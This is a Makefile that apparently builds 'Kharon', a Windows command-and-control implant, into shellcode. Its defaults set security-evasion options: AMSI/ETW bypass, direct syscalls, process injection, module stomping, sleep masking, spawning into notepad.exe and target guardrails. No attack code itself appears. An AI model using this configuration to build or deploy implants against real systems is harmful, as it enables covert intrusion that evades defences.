NAME   := Kharon

BUILD_PATH ?= .
OBJ_PATH   := $(BUILD_PATH)/Bin/obj
PREBUILD_MARKER := $(OBJ_PATH)/.prebuild_done

CCX64  := clang++ -target x86_64-w64-mingw32
CCX86  := clang++ -target i686-w64-mingw32
ASMCC  := nasm

CFLAGS := -Os -nostdlib -fno-asynchronous-unwind-tables -std=c++20 -fPIC
CFLAGS += -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types
CFLAGS += -fno-ident -fpack-struct=8 -falign-functions=1 -w -mno-sse -s
CFLAGS += -ffunction-sections -falign-jumps=1 -falign-labels=1 -mrdrnd
CFLAGS += -Wl,-s,--no-seh,--enable-stdcall-fixup -masm=intel -fno-exceptions
CFLAGS += -fms-extensions -IInclude -Wl,-TLinker.ld -Wno-error=anonymous-struct

SRC    := $(wildcard Source/*.cc)
MISC   := $(wildcard Source/Misc/*.cc)
COMM   := $(wildcard Source/Communication/*.cc)
EVS    := $(wildcard Source/Evasion/*.cc)
INTN   := $(wildcard Source/Internals/*.cc)

# Exclude Config.cc from prebuild
SRC_NO_CONFIG    := $(filter-out Source/Config.cc, $(SRC))

# Prebuild objects (all except Config.cc)
PREBUILD_OBJ64_PATHS := $(SRC_NO_CONFIG:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(MISC:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(COMM:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(EVS:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(INTN:%.cc=$(OBJ_PATH)/%.x64.obj)

PREBUILD_OBJ86_PATHS := $(SRC_NO_CONFIG:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(MISC:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(COMM:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(EVS:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(INTN:%.cc=$(OBJ_PATH)/%.x86.obj)

# Config objects (compiled ONLY in final build, not in prebuild)
CONFIG_OBJ64 := $(OBJ_PATH)/Config.x64.obj
CONFIG_OBJ86 := $(OBJ_PATH)/Config.x86.obj

# ASM objects
ASM_OBJ64 := $(OBJ_PATH)/entry_asm.x64.obj $(OBJ_PATH)/spoof_asm.x64.obj
ASM_OBJ86 := $(OBJ_PATH)/entry.x86.obj

# All objects for final link
OBJ64_FINAL  := $(PREBUILD_OBJ64_PATHS) $(ASM_OBJ64) $(CONFIG_OBJ64)
OBJ86_FINAL  := $(PREBUILD_OBJ86_PATHS) $(ASM_OBJ86) $(CONFIG_OBJ86)

# Defaults when variables are not passed (e.g. setup_kharon.sh / bare make). Empty -D FOO= defines FOO
# with no body, so #ifndef fallbacks in Defines.h / Communication.h never run and Config.cc breaks.
# Teamserver builds still override via make VAR=value ... (see src_server/pl_agent.go).
KH_AGENT_UUID            ?= f47ac10b-58cc-4372-a567-0e02b2c3d479
KH_AMSI_ETW_BYPASS       ?= 0x0
KH_SYSCALL               ?= 0
KH_BOF_HOOK_ENABLED      ?= 0
KH_WORKTIME_ENABLED      ?= 0
KH_WORKTIME_START_HOUR   ?= 0
KH_WORKTIME_START_MIN    ?= 0
KH_WORKTIME_END_HOUR     ?= 0
KH_WORKTIME_END_MIN      ?= 0
KH_KILLDATE_ENABLED      ?= 0
KH_KILLDATE_DAY          ?= 0
KH_KILLDATE_MONTH        ?= 0
KH_KILLDATE_YEAR         ?= 0
KH_SLEEP_TIME            ?= 3
KH_INJECTION_ID          ?= INJECTION_STANDARD
KH_STOMP_MODULE          ?= chakra.dll
KH_JITTER                ?= 0
KH_SPAWNTO_X64           ?= C:\\Windows\\System32\\notepad.exe
KH_INJECTION_PE          ?= 0
KH_INJECTION_SC          ?= 0
KH_HEAP_MASK             ?= 0
KH_SLEEP_MASK            ?= 3
WEB_SECURE_ENABLED       ?= 0
WEB_PROXY_ENABLED        ?= 0
WEB_PROXY_URL            ?=
WEB_PROXY_USERNAME       ?=
WEB_PROXY_PASSWORD       ?=

# Match pl_agent.go: only pass these when set so headers can use #ifndef defaults (nullptr, { 0x00 }, etc.).
DEFS_OPT :=
ifneq ($(strip $(KH_GUARDRAILS_USER)),)
DEFS_OPT += -D KH_GUARDRAILS_USER='"$(KH_GUARDRAILS_USER)"'
endif
ifneq ($(strip $(KH_GUARDRAILS_HOST)),)
DEFS_OPT += -D KH_GUARDRAILS_HOST='"$(KH_GUARDRAILS_HOST)"'
endif
ifneq ($(strip $(KH_GUARDRAILS_IPADDRESS)),)
DEFS_OPT += -D KH_GUARDRAILS_IPADDRESS='"$(KH_GUARDRAILS_IPADDRESS)"'
endif
ifneq ($(strip $(KH_GUARDRAILS_DOMAIN)),)
DEFS_OPT += -D KH_GUARDRAILS_DOMAIN='"$(KH_GUARDRAILS_DOMAIN)"'
endif
ifneq ($(strip $(KH_FORK_PIPENAME)),)
DEFS_OPT += -D KH_FORK_PIPE_NAME='$(KH_FORK_PIPENAME)'
endif
ifneq ($(strip $(HTTP_MALLEABLE_BYTES)),)
DEFS_OPT += '-DHTTP_MALLEABLE_BYTES=$(HTTP_MALLEABLE_BYTES)'
endif
ifneq ($(strip $(SMB_PIPE_NAME)),)
DEFS_OPT += '-DSMB_PIPE_NAME=$(SMB_PIPE_NAME)'
endif

DEFS := \
 	-D KH_AGENT_UUID='"$(KH_AGENT_UUID)"' \
	-D KH_AMSI_ETW_BYPASS=$(KH_AMSI_ETW_BYPASS) \
	-D KH_SYSCALL=$(KH_SYSCALL) \
	-D KH_BOF_HOOK_ENABLED=$(KH_BOF_HOOK_ENABLED) \
	-D KH_WORKTIME_ENABLED=$(KH_WORKTIME_ENABLED) \
	-D KH_WORKTIME_START_HOUR=$(KH_WORKTIME_START_HOUR) \
	-D KH_WORKTIME_START_MIN=$(KH_WORKTIME_START_MIN) \
	-D KH_WORKTIME_END_HOUR=$(KH_WORKTIME_END_HOUR) \
	-D KH_WORKTIME_END_MIN=$(KH_WORKTIME_END_MIN) \
	-D KH_KILLDATE_ENABLED=$(KH_KILLDATE_ENABLED) \
	-D KH_KILLDATE_DAY=$(KH_KILLDATE_DAY) \
	-D KH_KILLDATE_MONTH=$(KH_KILLDATE_MONTH) \
	-D KH_KILLDATE_YEAR=$(KH_KILLDATE_YEAR) \
	-D KH_SLEEP_TIME=$(KH_SLEEP_TIME) \
	-D KH_INJECTION_ID=$(KH_INJECTION_ID) \
	-D KH_STOMP_MODULE='L"$(KH_STOMP_MODULE)"' \
	-D KH_JITTER=$(KH_JITTER) \
	-D KH_SPAWNTO_X64='L"$(KH_SPAWNTO_X64)"' \
	-D KH_INJECTION_PE=$(KH_INJECTION_PE) \
	-D KH_INJECTION_SC=$(KH_INJECTION_SC) \
	-D KH_HEAP_MASK=$(KH_HEAP_MASK) \
	-D KH_SLEEP_MASK=$(KH_SLEEP_MASK) \
	-D HTTP_SECURE_ENABLED=$(WEB_SECURE_ENABLED) \
	-D HTTP_PROXY_ENABLED=$(WEB_PROXY_ENABLED) \
	-D HTTP_PROXY_URL='L"$(WEB_PROXY_URL)"' \
	-D HTTP_PROXY_PASSWORD='L"$(WEB_PROXY_PASSWORD)"' \
	-D HTTP_PROXY_USERNAME='L"$(WEB_PROXY_USERNAME)"' \
	$(DEFS_OPT)

.PHONY: all release debug x64 x86 x64-debug x86-debug prebuild-x64 prebuild-x86 clean show-prebuild force_config

all: release debug
release: x64 x86 
debug: x64-debug x86-debug

x64-release: x64 
x86-release: x86

x64-debug: CFLAGS += -D DEBUG
x64-debug: x64

x86-debug: CFLAGS += -D DEBUG
# x86-debug: x86

# ==================== PREBUILD TARGETS ====================
# Compile all objects except Config.cc and create marker file
prebuild-x64: nasm64 $(PREBUILD_OBJ64_PATHS)
	@ mkdir -p $(OBJ_PATH)
	@ touch $(PREBUILD_MARKER).x64
	@ echo "[✓] Prebuild x64 completed (Config.cc will be compiled in final build)"

prebuild-x86: nasm86 $(PREBUILD_OBJ86_PATHS)
	@ mkdir -p $(OBJ_PATH)
	@ touch $(PREBUILD_MARKER).x86
	@ echo "[✓] Prebuild x86 completed (Config.cc will be compiled in final build)"

# ==================== FINAL BUILD TARGETS ====================
x64: prebuild-x64 $(CONFIG_OBJ64)
	@ echo "[*] Linking x64..."
	@ $(CCX64) $(OBJ64_FINAL) -o $(BUILD_PATH)/Bin/$(NAME).x64.exe $(CFLAGS)
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x64.bin $(BUILD_PATH)/Bin/$(NAME).x64.exe
	@ rm $(BUILD_PATH)/Bin/$(NAME).x64.exe
	@ echo "[✓] Build x64 completed"

x86: prebuild-x86 $(CONFIG_OBJ86)
	@ echo "[*] Linking x86..."
	@ $(CCX86) $(OBJ86_FINAL) -o $(BUILD_PATH)/Bin/$(NAME).x86.exe $(CFLAGS)
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x86.bin $(BUILD_PATH)/Bin/$(NAME).x86.exe
	@ rm $(BUILD_PATH)/Bin/$(NAME).x86.exe
	@ echo "[✓] Build x86 completed"

# ==================== COMPILATION RULES ====================
# Prebuild objects (all except Config.cc)
$(OBJ_PATH)/%.x64.obj: %.cc
	@ mkdir -p $(dir $@)
	@ echo "  -> compiling $< (x64)"
	@ $(CCX64) -o $@ -c $< $(CFLAGS) $(DEFS)

$(OBJ_PATH)/%.x86.obj: %.cc
	@ mkdir -p $(dir $@)
	@ echo "  -> compiling $< (x86)"
	@ $(CCX86) -o $@ -c $< $(CFLAGS) $(DEFS)

# Config.cc - compiled ONLY in final build (not in prebuild) - FORCE RECOMPILE
$(CONFIG_OBJ64): Source/Config.cc force_config
	@ mkdir -p $(dir $@)
	@ echo "[*] Compiling Config.cc x64..."
	@ $(CCX64) -o $@ -c $< $(CFLAGS) $(DEFS)

$(CONFIG_OBJ86): Source/Config.cc force_config
	@ mkdir -p $(dir $@)
	@ echo "[*] Compiling Config.cc x86..."
	@ $(CCX86) -o $@ -c $< $(CFLAGS) $(DEFS)

# Force Config.cc to always recompile
force_config:
	@ # This forces Config.cc to always recompile when included as dependency
	@ true

# ==================== ASM TARGETS ====================
nasm64:
	@ mkdir -p $(OBJ_PATH)
	@ $(ASMCC) -f win64 Source/Asm/Entry.x64.asm -o $(OBJ_PATH)/entry_asm.x64.obj
	@ $(ASMCC) -f win64 Source/Asm/Spoof.x64.asm -o $(OBJ_PATH)/spoof_asm.x64.obj

nasm86:
	@ mkdir -p $(OBJ_PATH)
	@ $(ASMCC) -f win32 Source/Asm/Entry.x64.asm -o $(OBJ_PATH)/entry.x86.obj

# ==================== UTILITY TARGETS ====================
show-prebuild:
	@ echo "=== PREBUILD CONFIG ==="
	@ echo "Prebuild Objects (x64): $(words $(PREBUILD_OBJ64_PATHS)) files"
	@ echo "Prebuild Objects (x86): $(words $(PREBUILD_OBJ86_PATHS)) files"
	@ echo ""
	@ echo "EXCLUDED FROM PREBUILD:"
	@ echo "  - Source/Config.cc"
	@ echo ""
	@ echo "Compiled in FINAL BUILD"
	@ echo "========================"

clean:
	@ rm -rf $(BUILD_PATH)/Bin/obj/
	@ rm -f $(BUILD_PATH)/Bin/*.exe
	@ rm -f $(BUILD_PATH)/Bin/*.bin
	@ echo "[✓] Cleanup completed"

clean-prebuild:
	@ rm -f $(PREBUILD_MARKER).*
	@ echo "[✓] Prebuild markers removed"

clean-all: clean clean-prebuild
	@ echo "[✓] Full cleanup completed"